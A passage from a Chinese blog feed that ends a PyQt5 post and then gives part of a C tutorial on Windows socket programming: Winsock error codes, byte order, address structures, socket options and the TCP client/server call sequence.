href="#1-QtWebEngineWidgets" class="headerlink" title="1 QtWebEngineWidgets"></a>1 QtWebEngineWidgets</h3><blockquote><p> <a href="https://www.cnblogs.com/Yanjy-OnlyOne/p/12068344.html">安装QtWebEngineWidgets</a></p></blockquote><ol><li>pip install pyqt5==5.10.1</li><li>pip install PyQtWebEngine</li></ol><hr><h2 id="八、案例"><a href="#八、案例" class="headerlink" title="八、案例"></a>八、案例</h2><ul><li><a href="https://www.cnblogs.com/dcb3688/p/4241048.html">简单二维码</a>    <a href="https://blog.csdn.net/qq_47452807/article/details/124233469">复杂二维码</a></li><li><a href="https://link.zhihu.com/?target=https%3A//github.com/learnpyqt/15-minute-apps">普通十五个项目</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Python </tag>
            
            <tag> 界面 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言Windows网络编程</title>
      <link href="/posts/4962e50b.html"/>
      <url>/posts/4962e50b.html</url>
      
        <content type="html"><![CDATA[<h1 id="C语言Windows网络编程"><a href="#C语言Windows网络编程" class="headerlink" title="C语言Windows网络编程"></a>C语言Windows网络编程</h1><hr><h2 id="〇、网络编程错误码"><a href="#〇、网络编程错误码" class="headerlink" title="〇、网络编程错误码"></a>〇、网络编程错误码</h2><details class="folding-tag" blue><summary> 错误码 </summary>              <div class="content">              <div class="table-container"><table><thead><tr><th>错误码</th><th>错误原因</th></tr></thead><tbody><tr><td>10045</td><td>参考的对象种类不支持尝试的操作</td></tr><tr><td>10046</td><td>协议家族尚未配置到系统中或没有它的存在迹象</td></tr><tr><td>10047</td><td>使用了与请求的协议不兼容的地址</td></tr><tr><td>10048</td><td>通常每个套接字地址 (协议/网络地址/端口)只允许使用一次</td></tr><tr><td>10049</td><td>在其上下文中，该请求的地址无效</td></tr><tr><td>10050</td><td>套接字操作遇到了一个已死的网络</td></tr><tr><td>10051</td><td>向一个无法连接的网络尝试了一个套接字操作</td></tr><tr><td>10052</td><td>当该操作在进行中，由于保持活动的操作检测到一个故障，该连接中断</td></tr><tr><td>10053</td><td>您的主机中的软件放弃了一个已建立的连接</td></tr><tr><td>10054</td><td>远程主机强迫关闭了一个现有的连接</td></tr><tr><td>10055</td><td>由于系统缓冲区空间不足或列队已满，不能执行套接字上的操作</td></tr><tr><td>10056</td><td>在一个已经连接的套接字上做了一个连接请求</td></tr><tr><td>10057</td><td>由于套接字没有连接并且 (当使用一个 sendto 调用发送数据报套接字时) 没有提供地址，发送或接收数据的请求没有被接受</td></tr><tr><td>10058</td><td>由于以前的关闭调用，套接字在那个方向已经关闭，发送或接收数据的请求没有被接受</td></tr><tr><td>10059</td><td>对某个内核对象的引用过多</td></tr><tr><td>10060</td><td>由于连接方在一段时间后没有正确的答复或连接的主机没有反应，连接尝试失败</td></tr><tr><td>10061</td><td>不能做任何连接，因为目标机器积极地拒绝它</td></tr><tr><td>10062</td><td>无法翻译名称</td></tr><tr><td>10063</td><td>名称组件或名称太长</td></tr><tr><td>10064</td><td>由于目标主机坏了，套接字操作失败</td></tr><tr><td>10065</td><td>套接字操作尝试一个无法连接的主机</td></tr><tr><td>10066</td><td>不能删除目录，除非它是空的</td></tr><tr><td>10067</td><td>一个 Windows 套接字操作可能在可以同时使用的应用程序数目上有限制</td></tr><tr><td>10068</td><td>超过限额</td></tr><tr><td>10069</td><td>超过磁盘限额</td></tr><tr><td>10070</td><td>文件句柄引用不再有效</td></tr><tr><td>10071</td><td>项目在本地不可用</td></tr><tr><td>10091</td><td>因为它使用提供网络服务的系统目前无效，WSAStartup 目前不能正常工作</td></tr><tr><td>10092</td><td>不支持请求的 Windows 套接字版本</td></tr><tr><td>10093</td><td>应用程序没有调用 WSAStartup，或者 WSAStartup 失败</td></tr><tr><td>10101</td><td>由 WSARecv 或 WSARecvFrom 返回表示远程方面已经开始了关闭步骤</td></tr><tr><td>10102</td><td>WSALookupServiceNext 不能返回更多的结果</td></tr><tr><td>10103</td><td>在处理这个调用时，就开始调用 WSALookupServiceEnd该调用被删除</td></tr><tr><td>10104</td><td>过程调用无效</td></tr><tr><td>10105</td><td>请求的服务提供程序无效</td></tr><tr><td>10106</td><td>没有加载或初始化请求的服务提供程序</td></tr><tr><td>10107</td><td>从来不应失败的系统调用失败了</td></tr><tr><td>10108</td><td>没有已知的此服务在指定的名称空间中找不这个服务</td></tr><tr><td>10109</td><td>找不到指定的类别</td></tr><tr><td>10110</td><td>WSALookupServiceNext 不能返回更多的结果</td></tr><tr><td>10111</td><td>在处理这个调用时，就开始调用 WSALookupServiceEnd该调用被删除</td></tr><tr><td>10112</td><td>由于被拒绝，数据查询失败</td></tr><tr><td>11001</td><td>不知道这样的主机</td></tr><tr><td>11002</td><td>这是在主机名解析时常出现的暂时错误，并且意味着本地服务器没有从权威服务器上收到响应</td></tr><tr><td>11003</td><td>在数据寻找中出现一个不可恢复的错误</td></tr><tr><td>11004</td><td>请求的名称有效并且是在数据库中找到，但是它没有相关的正确的数据</td></tr><tr><td>11005</td><td>至少到达了一个保留</td></tr><tr><td>11006</td><td>至少到达了一个路径</td></tr><tr><td>11007</td><td>没有发送方</td></tr><tr><td>11008</td><td>没有接受方</td></tr><tr><td>11009</td><td>保留已经确认</td></tr><tr><td>11010</td><td>错误是由于资源不足造成</td></tr><tr><td>11011</td><td>由于管理原因被拒绝 无效凭据</td></tr><tr><td>11012</td><td>未知或有冲突类型</td></tr><tr><td>11013</td><td>某一部分的 filterspec 或 providerspecific 缓冲区有问题</td></tr><tr><td>11014</td><td>flowspec 的某部分有问题</td></tr><tr><td>11015</td><td>一般性 QOS 错误</td></tr><tr><td>11016</td><td>在流程规格中发现一个无效的或不可识别的服务类型</td></tr><tr><td>11017</td><td>在 QOS 结构中发现一个无效的或不一致的流程规格</td></tr><tr><td>11018</td><td>无效的 QOS 提供程序特定缓冲区</td></tr><tr><td>11019</td><td>使用了无效的 QOS 筛选器样式</td></tr><tr><td>11020</td><td>使用了无效的 QOS 筛选器类型</td></tr><tr><td>11021</td><td>FLOWDESCRIPTOR 中指定的 QOS FILTERSPEC 数量不正确</td></tr></tbody></table></div>              </div>            </details><hr><h2 id="一、基本概念"><a href="#一、基本概念" class="headerlink" title="一、基本概念"></a>一、基本概念</h2><h3 id="1-计算机网络和TCPIP协议"><a href="#1-计算机网络和TCPIP协议" class="headerlink" title="1 计算机网络和TCPIP协议"></a>1 计算机网络和TCPIP协议</h3><ul><li>五层结构</li></ul><h3 id="2-网络通信模型"><a href="#2-网络通信模型" class="headerlink" title="2 网络通信模型"></a>2 网络通信模型</h3><ul><li><p>C/S</p></li><li><p>B/S</p></li><li><p>P2P</p></li></ul><h3 id="3-网络数据传输"><a href="#3-网络数据传输" class="headerlink" title="3 网络数据传输"></a>3 网络数据传输</h3><ul><li><p>字节</p><ul><li><p>大端顺序：高字节存在内存低地址。  </p></li><li><p>小端顺序：低字节存在内存低地址。</p><blockquote><p>例如：对于0x12345678     大端： 地址0 [ 0x12 , 0x34 , 0x56 , 0x78 ] 地址31     小端： 地址0 [ 0x78 , 0x56 , 0x34 , 0x12 ] 地址31</p><p>一般情况下：网络传输用大端模式，内存存储用小端模式。（例如基于x86平台的PC机）</p></blockquote></li></ul></li><li><p>对齐</p><blockquote><p>C语言结构体存储会自动对齐。</p></blockquote></li><li><p>编码</p><blockquote><p>Base64是网络上最常见的用于传输8比特方式之一，可用于在HTTP环境下传递较长的标识信息。</p></blockquote></li></ul><h3 id="4-编程概念"><a href="#4-编程概念" class="headerlink" title="4 编程概念"></a>4 编程概念</h3><ul><li><p>接口功能</p><ul><li>基本功能<ul><li>分配用于通信的本地资源。</li><li>指定本地与远程通信端点。</li><li>（客户端）启动连接。</li><li>（服务器）等待连接到来。</li><li>发送或接收数据。</li><li>判断数据何时到来。</li><li>从容终止连接。</li></ul></li><li>辅助功能：<ul><li>产生紧急数据。</li><li>处理到来的紧急数据。</li><li>处理来自远程端点的连接终止。</li><li>异常终止通信。</li><li>处理错误条件或连接异常终止。</li><li>连接结束后释放本地资源。</li></ul></li></ul></li><li><p><a href="https://www.cnblogs.com/xiaofeifei/p/4060497.html">UNIX中的基本I/O功能</a></p><blockquote><p>内核通过文件描述符引用打开的文件，通常通过open函数或者create函数返回文件描述符。</p></blockquote></li></ul><h3 id="5-套接字"><a href="#5-套接字" class="headerlink" title="5 套接字"></a>5 套接字</h3><ul><li><p>协议</p><ul><li>PF_INET：IPv4协议簇</li><li>PF_INET6：IPv6协议簇​</li><li>PF_IPX：IPX/SPX协议簇</li><li>PF_NETBIOS：NetBIOS协议簇</li></ul></li><li><p>套接字类型</p><ul><li>SOCK_STREAM：TCP协议</li><li>SOCK_DGRAM：UDP协议</li><li>SOCK_RAW：IP协议</li></ul></li><li><p>端点地址</p><ul><li>AF_INET：IPv4地址族</li><li>AF_INET6：IPv6地址族</li><li>AF_IPX：IPX/SPX地址族</li><li>AF_NETBIOS：NetBIOS地址族</li><li>AF_UNSPEC 则意味着函数返回的是适用于指定主机名和服务名且适合任何协议族的地址。</li></ul></li><li><p>通信过程</p><ol><li>建立一个Socket。</li><li>配置Socket。</li><li>连接Socket。（可选）</li><li>通过Socket发送数据。</li><li>通过Socket接收数据。</li><li>关闭Socket。</li></ol></li></ul><h3 id="6-多线程编程"><a href="#6-多线程编程" class="headerlink" title="6 多线程编程"></a>6 多线程编程</h3><ul><li>使用<ol><li>创建线程函数。</li><li>创建线程。</li><li>激活线程。</li><li>结束线程。</li></ol></li></ul><hr><h2 id="二、函数"><a href="#二、函数" class="headerlink" title="二、函数"></a>二、函数</h2><h3 id="1-头文件"><a href="#1-头文件" class="headerlink" title="1 头文件"></a>1 头文件</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// VS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _WINSOCK_DEPRECATED_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WS2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="comment">//连接到WinSock2对应的文件:Ws2_32.lib, Mswsock.lib, Advapi32.lib</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (lib, <span class="string">&quot;Ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (lib, <span class="string">&quot;Mswsock.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (lib, <span class="string">&quot;AdvApi32.lib&quot;</span>)</span></span><br></pre></td></tr></table></figure><h3 id="2-网络数据函数"><a href="#2-网络数据函数" class="headerlink" title="2 网络数据函数"></a>2 网络数据函数</h3><ul><li><p>网络与主机类型转化</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//网络变主机</span></span><br><span class="line"><span class="function">u_short WSAPPI <span class="title">ntohs</span><span class="params">(__in u_short netshort)</span></span>; <span class="comment">// u_short</span></span><br><span class="line"><span class="function">u_long WSAPPI <span class="title">ntohl</span><span class="params">(__in u_long netlong)</span></span>; <span class="comment">// u_long</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//主机变网络</span></span><br><span class="line"><span class="function">u_short WSAPPI <span class="title">htons</span><span class="params">( __in u_short hostshort)</span></span>; <span class="comment">// u_short</span></span><br><span class="line"><span class="function">u_long WSAPPI <span class="title">htonl</span><span class="params">( __in u_long hostlong)</span></span>; <span class="comment">// u_long</span></span><br></pre></td></tr></table></figure></li><li><p>对齐</p><p><code>#pragma pack([show]|[push|pop][,identifier],n);</code></p><blockquote><p><a href="https://www.jianshu.com/p/d994731f658d">#pragma pack用法</a></p><p>#pragma pack()设置的是默认对齐模数。</p></blockquote><ul><li><p>show</p><blockquote><p>可选参数，显示当前对齐的模板，以警告消息的形式显示。</p></blockquote></li><li><p>push</p><blockquote><p>对齐模数n压栈，未指定n则压入当前对齐模数。</p><p>push一般带n。</p></blockquote></li><li><p>pop</p><blockquote><p>n出栈。不带n设置出栈数为对齐模数，设置n则会出栈并设置n为对齐模数。</p><p>pop一般不带n。</p></blockquote></li><li><p>identifier</p><blockquote><p>编译器执行这条执行时会从栈顶向下顺序查找匹配的identifier，找到identifier相同的这个数之后将从栈顶到identifier，包括找到identifier全部pop弹出， 若没有找到则不进行任何操作。</p></blockquote></li><li><p>n</p><blockquote><p>对齐模数。</p></blockquote></li></ul></li><li><p>数据校验</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 实例</span></span><br><span class="line"><span class="comment">// 数据校验，传入数据包头和数据包头长</span></span><br><span class="line"><span class="function">u_short <span class="title">in_cksum</span><span class="params">(u_short* pchBuffer,<span class="type">int</span> iSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    u_long ulCksum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (iSize &gt; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">ulCksum += *pchBuffer++;</span><br><span class="line">iSize -= <span class="built_in">sizeof</span>(u_short);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">if</span> (iSize)</span><br><span class="line">       ulCksum += *(UCHAR*)pchBuffer;</span><br><span class="line">    ulCksum = (ulCksum &gt;&gt; <span class="number">16</span>) + (ulCksum &amp; <span class="number">0xffff</span>);</span><br><span class="line">    ulCksum += (ulCksum &gt;&gt; <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> (USHORT)(~ulCksum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-Windows套接字函数"><a href="#3-Windows套接字函数" class="headerlink" title="3 Windows套接字函数"></a>3 Windows套接字函数</h3><ul><li><p>WSAStartup()</p><blockquote><p>Windows Sockets DLL的初始化。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义：</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">WSAStartup</span><span class="params">( __in WORD wVersionRequested , __out LPWSADATA lpWSAData )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// wVersionRequested[in]：一个WORD（双字节）型数值，在最高版本的Windows Sockets支持调用者使用，高阶字节指定小版本(修订本)号,低位字节指定主版本号。</span></span><br><span class="line"><span class="comment">// lpWSAData[out]：指向WSADATA数据结构的指针，用来接收Windows Sockets实现的细节。</span></span><br><span class="line"><span class="comment">// 成功返回0，失败返回错误码。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用：</span></span><br><span class="line">WSADATA wsaData; </span><br><span class="line"><span class="type">int</span> iResult; </span><br><span class="line">iResult = <span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>,<span class="number">2</span>),&amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (iResult != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed with error: %d\n&quot;</span>,iResult);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>WSACleanup()</p><blockquote><p>Windows Sockets DLL的释放。</p><p>每一次WSAStartup()必须有一个对应的WSACleanup()。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">WSACleanup</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br><span class="line"><span class="comment">// 成功返回0，失败返回错误码。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"><span class="type">int</span> iResult; </span><br><span class="line">iResult = <span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">if</span> (iResult != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed with error: %d\n&quot;</span>,iResult);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>IPv4地址结构</p><blockquote><p>使用时应该把 sockaddr_in强转为sockaddr传递。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 地址结构</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">sockaddr</span></span><br><span class="line">&#123;</span><br><span class="line">    ushort sa_family ; <span class="comment">// 地址族标识符</span></span><br><span class="line">    <span class="type">char</span> sa_data[<span class="number">14</span>] ; <span class="comment">// 存储地址</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 常用的IPv4地址结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">in_addr</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">u_char s_b1, s_b2, s_b3, s_b4;</span><br><span class="line">        &#125; S_un_b;</span><br><span class="line">    <span class="keyword">struct</span></span><br><span class="line">        &#123;</span><br><span class="line">u_short s_w1, s_w2;</span><br><span class="line">        &#125; S_un_w;</span><br><span class="line">u_long S_addr;</span><br><span class="line">    &#125; S_un;</span><br><span class="line">&#125;IN_ADDR,*PIN_ADDR,FAR* LPIN_ADDR;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用于填写IP和端口</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">sockaddr_in</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">short</span> sin_family; <span class="comment">// 地址族</span></span><br><span class="line">    u_short sin_port; <span class="comment">// 端口号</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">in_addr</span> sin_addr; <span class="comment">// IPv4地址（使用为 hints.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;);）</span></span><br><span class="line">    <span class="type">char</span> sin_zero[<span class="number">8</span>]; <span class="comment">// 保留</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>IPv6地址结构</p><blockquote><p>使用时应该把 sockaddr_in6强转为sockaddr传递。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 常用的IPv6地址结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">in6_addr</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">&#123;</span><br><span class="line">u_char Byte[<span class="number">16</span>];</span><br><span class="line">        u_short Word[<span class="number">8</span>];</span><br><span class="line">    &#125;u;</span><br><span class="line">&#125;IN6_ADDR,*PIN6_ADDR,FAR* LPIN6_ADDR;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用于填写IPv6和端口</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">sockaddr_in6</span></span><br><span class="line">&#123;       </span><br><span class="line">    <span class="type">short</span> sin6_family; <span class="comment">// 地址族</span></span><br><span class="line">    u_short sin6_port; <span class="comment">// 端口号</span></span><br><span class="line">    u_long sin6_flowinfo; <span class="comment">// 流信息</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">in6_addr</span> sin6_addr; <span class="comment">// IPv6地址</span></span><br><span class="line">    <span class="type">char</span> sin6_scope_id;<span class="comment">// Scope标识</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>addrinfo</p><blockquote><p>WinSock2增加的一个以链表形式保存地址信息的函数。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// getaddrinfo()获得地址</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">addrinfo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ai_flags; <span class="comment">// getaddrinfo函数的调用选项</span></span><br><span class="line">    <span class="type">int</span> ai_family; <span class="comment">// 地址族</span></span><br><span class="line">    <span class="type">int</span> ai_socktype; <span class="comment">// 套接字类型</span></span><br><span class="line">    <span class="type">int</span> ai_protocol; <span class="comment">// 协议</span></span><br><span class="line">    <span class="type">size_t</span> ai_addrlen; <span class="comment">// ai_addr指向的sockaddr结构的缓冲区字节长度</span></span><br><span class="line">    <span class="type">char</span>* ai_canonname; <span class="comment">// 主机的正规名称</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sockaddr</span>* ai_addr; <span class="comment">// 以sockaddr结构描述的地址信息</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">addrinfo</span>* ai_next; <span class="comment">// 指向下一个addrinfo结构</span></span><br><span class="line">&#125;ADDRINFOA,*PADDRINFOA;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得地址</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getaddrinfo</span></span></span><br><span class="line"><span class="function"><span class="params">( </span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> <span class="type">char</span>* hostname, <span class="comment">// 主机名（无填NULL）</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> <span class="type">char</span>* service, <span class="comment">// 端口号</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> <span class="keyword">struct</span> addrinfo* hints, <span class="comment">// 输入类型结构体</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">struct</span> addrinfo** result <span class="comment">// 返回获得地址的结构体</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>IPv4点分与无符号整形转化</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// IP-&gt;u_long</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> <span class="title">inet_addr</span><span class="params">( __in <span class="type">const</span> <span class="type">char</span>* cp)</span></span>;    </span><br><span class="line"><span class="comment">// u_long-&gt;IP</span></span><br><span class="line"><span class="function"><span class="type">char</span> *FAR <span class="title">inet_ntoa</span><span class="params">( __in <span class="keyword">struct</span> in_addr in)</span></span>;     </span><br></pre></td></tr></table></figure></li><li><p>套接字选项</p><blockquote><p><a href="https://blog.csdn.net/x13262608581/article/details/109144584">套接字选项</a></p><p><a href="https://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=57749149&amp;ss_c=ssc.citiao.link">套接口</a></p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取套接字选项</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getsockopt</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    __in socket s, <span class="comment">// 一个标识套接口的描述字</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> level, <span class="comment">// 选项定义的层次。支持的层次仅有SOL_SOCKET和IPPROTO_TCP。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> optname, <span class="comment">// 需获取的套接口选项。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __out <span class="type">char</span>* optval, <span class="comment">// 指针，指向存放所获得选项值的缓冲区。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __inout <span class="type">int</span>* optlen, <span class="comment">// 指针，指向optval缓冲区的长度值。</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置套接字选项</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">setsockopt</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    __in socket s, <span class="comment">// 一个标识套接口的描述字</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> level, <span class="comment">// 选项定义的层次。支持的层次仅有SOL_SOCKET和IPPROTO_TCP。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> optname, <span class="comment">// 需获取的套接口选项。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">const</span> <span class="type">char</span>* optval, <span class="comment">// 指针，指向存放所获得选项值的缓冲区。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> optlen, <span class="comment">// 指向optval缓冲区的长度值。</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例子</span></span><br><span class="line"><span class="comment">// 超时设置</span></span><br><span class="line"><span class="type">int</span> time = <span class="number">1000</span>; <span class="comment">// 毫秒</span></span><br><span class="line"><span class="type">int</span> r = <span class="built_in">setsockopt</span>(s,SOL_SOCKET,SO_RCVTIMEO,(<span class="type">const</span> <span class="type">char</span>*)&amp;time,<span class="built_in">sizeof</span>(time));</span><br><span class="line"><span class="comment">// 广播</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> time = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">setsockopt</span>(s,SOL_SOCKET,SO_BROADCAST,(<span class="type">const</span> <span class="type">char</span>*)&amp;time,<span class="built_in">sizeof</span>(time));</span><br></pre></td></tr></table></figure><p><img src="/posts/4962e50b/套接字可选项1.jpg" alt="img"><img src="/posts/4962e50b/套接字可选项2.jpg" alt="img"></p></li><li><p>I/O控制命令</p><blockquote><p><a href="https://baike.sogou.com/v74039035.htm?fromTitle=WSAIoctl(">int WSAAPI WSAIoctl()</a>)</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 控制套接字I/O模式</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ioctlsocket</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">__in <span class="type">int</span> s, <span class="comment">// 套接字句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">long</span> cmd, <span class="comment">// 指示在套接字上要执行的命令</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in_out u_long * argp <span class="comment">// 指向cmd的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例</span></span><br><span class="line"><span class="comment">// 设置网卡混杂模式</span></span><br><span class="line">u_long optival = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">isoctlsocket</span>(s,SIO_RCVALL,&amp;optival);</span><br></pre></td></tr></table></figure><p><img src="/posts/4962e50b/IO控制命令可选项.jpg" alt="img"></p></li><li><p>补充</p><ul><li><p>WSAGetLastError()</p><blockquote><p>获得上次失败操作的错误码。</p></blockquote></li><li><p><a href="https://baike.sogou.com/v71802588.htm?fromTitle=shutdown(">shutdown()</a>)</p><blockquote><p>禁止某些操作。</p></blockquote></li></ul></li></ul><h3 id="4-TCP函数"><a href="#4-TCP函数" class="headerlink" title="4 TCP函数"></a>4 TCP函数</h3><ul><li><p>TCP通信过程</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 服务器进程</span></span><br><span class="line"><span class="comment">// Windows Sockets DLL初始化，协商版本号</span></span><br><span class="line"><span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line"><span class="comment">// 创建套接字，指定使用TCP通信</span></span><br><span class="line"><span class="built_in">socket</span>();</span><br><span class="line"><span class="comment">// 指定本地地址和通信端口</span></span><br><span class="line"><span class="built_in">getaddrinfo</span>();<span class="built_in">bind</span>();</span><br><span class="line"><span class="comment">// 等待客户连接请求</span></span><br><span class="line"><span class="built_in">listen</span>();</span><br><span class="line"><span class="comment">// 进行数据传输</span></span><br><span class="line"><span class="built_in">accept</span>();<span class="built_in">send</span>();<span class="built_in">recv</span>();</span><br><span class="line"><span class="comment">// 关闭套接字</span></span><br><span class="line"><span class="built_in">shutdown</span>();<span class="built_in">closesocket</span>();</span><br><span class="line"><span class="comment">//结束对Windows Sockets DLL的使用，释放资源</span></span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//客户端进程</span></span><br><span class="line"><span class="comment">// Windows Sockets DLL初始化，协商版本号</span></span><br><span class="line"><span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line"><span class="comment">// 创建套接字，指定使用TCP通信</span></span><br><span class="line"><span class="built_in">socket</span>();</span><br><span class="line"><span class="comment">// 指定服务器地址和通信端口</span></span><br><span class="line"><span class="built_in">getaddrinfo</span>();</span><br><span class="line"><span class="comment">// 向服务器发送连接请求</span></span><br><span class="line"><span class="built_in">connect</span>();</span><br><span class="line"><span class="comment">// 进行数据传输</span></span><br><span class="line"><span class="built_in">send</span>();<span class="built_in">recv</span>();</span><br><span class="line"><span class="comment">// 关闭套接字</span></span><br><span class="line"><span class="built_in">shutdown</span>();<span class="built_in">closesocket</span>();</span><br><span class="line"><span class="comment">// 结束对Windows Sockets DLL的使用，释放资源</span></span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br></pre></td></tr></table></figure></li><li><p>套接字</p><blockquote><p><a 